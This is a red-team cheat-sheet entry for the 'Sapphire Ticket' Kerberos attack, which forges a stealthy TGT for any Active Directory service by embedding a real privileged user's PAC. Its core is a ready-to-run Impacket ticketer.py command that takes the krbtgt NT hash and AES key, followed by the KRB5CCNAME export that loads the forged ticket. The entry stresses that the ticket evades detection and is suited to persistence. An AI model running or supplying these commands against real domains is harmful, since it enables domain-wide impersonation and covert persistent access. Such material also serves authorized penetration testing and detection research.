---
technique: SapphireTicket
category: kerberos-forged-tickets
targets: Domain (all services)
protocols: Kerberos
remote_capable: true
tags: kerberos sapphire-ticket tgt forged-pac s4u2self u2u ad stealth persistence
---

# Sapphire Ticket

Sapphire tickets are the stealthiest variant of the golden/diamond family. Instead of forging or patching a PAC with arbitrary group IDs, the technique obtains a real privileged user's PAC via an S4U2self + U2U request and embeds that authentic PAC into a newly requested TGT. The result has no discrepancy between what the PAC claims and what Active Directory actually holds, making it the most difficult forged ticket to detect. The krbtgt NT hash and AES key are required. Note that the S4U2self + U2U path produces a service ticket PAC that lacks the `PAC_REQUESTOR` and `PAC_ATTRIBUTES_INFO` structures introduced by KB5008380 (CVE-2021-42287 enforcement phase, October 2022), which can cause a `KDC_ERR_TGT_REVOKED` error in fully patched environments when the resulting TGT is used.

## Windows

No equivalent Windows tooling existed as of the time the technique was published; use Impacket from Linux.

## Linux

Impacket ticketer with `-request` and `-impersonate` fetches the target user's PAC via S4U2self + U2U and embeds it in a freshly requested ticket.

### Step 1: ticketer (sapphire)

#python #impacket #tgt #u2u

Request a legitimate TGT and replace its PAC with the real PAC of the impersonated privileged user obtained via S4U2self + U2U.

```sh title:"Forge sapphire ticket via Impacket ticketer"
ticketer.py -request -impersonate "$impersonate_user" -domain "$domain" -user "$user" -password "$pass" -nthash "$krbtgt_nt_hash" -aesKey "$krbtgt_aes256" -user-id "$requestor_user_id" -domain-sid "$domain_sid" "$ticket_username"
```
<!-- cheat
import domain_ip
import users
import passwords
var domain
var impersonate_user
var krbtgt_nt_hash
var krbtgt_aes256
var requestor_user_id
var domain_sid
var ticket_username
-->

### Step 2: Set KRB5CCNAME to sapphire ticket

#shell #env

Set KRB5CCNAME to the ccache written by ticketer.py so subsequent Kerberos tools use the sapphire ticket.

```sh title:"Load ticketer.py ccache into KRB5CCNAME"
export KRB5CCNAME="$ticket_username.ccache"
```
<!-- cheat
var ticket_username
-->
